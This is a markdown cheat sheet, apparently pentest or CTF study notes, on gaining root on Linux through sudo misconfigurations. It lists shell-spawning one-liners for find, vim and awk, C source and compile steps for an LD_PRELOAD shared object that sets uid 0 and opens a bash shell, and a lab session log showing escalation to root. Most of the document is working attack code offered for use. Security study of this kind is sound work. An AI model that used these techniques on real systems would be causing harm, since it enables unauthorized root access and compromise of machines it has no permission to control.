# Exploit sudo misconfigurations

Become root on Linux via sudo exploit:

1. Find which commands current user is allowed to use (`sudo -l`)
2. Exploit the parameters of a command that is allowed to be executed with root permissions

```text
sudo find /etc/passwd -exec /bin/sh \; 
sudo vim -c '!sh' 
sudo awk 'BEGIN {system(“/bin/sh”)}'
```

Or use other commands that are allowed to be executed with `root` permissions to invoke a shell

## Example: find

### LD_PRELOAD

`LD_PRELOAD` allows program to [use/load shared libraries](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/). 
If the `env_keep` option is enabled we can generate a shared library which will be loaded and executed before the program is run. The `LD_PRELOAD` option will be ignored if the real user ID is different from the effective user ID.

1. Check for `env_keep+=LD_PRELOAD` (using `sudo -l`)
2. Write a simple C code compiled as a share object (`.so` extension) file

```text
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Save as shell.c and compile:

    gcc -fPIC -shared -o shell.so shell.c -nostartfiles

Use this shared object file when launching any program the user can run with sudo.

3. Run the program with sudo rights and the `LD_PRELOAD` option pointing to the `.so` file

```text
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

This will result in a shell spawn with root privileges.

### Another find

Another [find in GTFObins](https://gtfobins.github.io/gtfobins/find/) for escalating privileges with `find`:

```text
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
...
$ sudo -l
Matching Defaults entries for karen on ip-10-10-0-32:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-0-32:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)
$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Notes

The `sudo` command, by default, allows for running a program with root privileges. System administrators sometimes give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap but would not be cleared for full root access. The system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the `sudo -l` command.

Use [GTFObins](https://gtfobins.github.io/) for gathering information on how any program, on which a user may have sudo rights, can be used. 
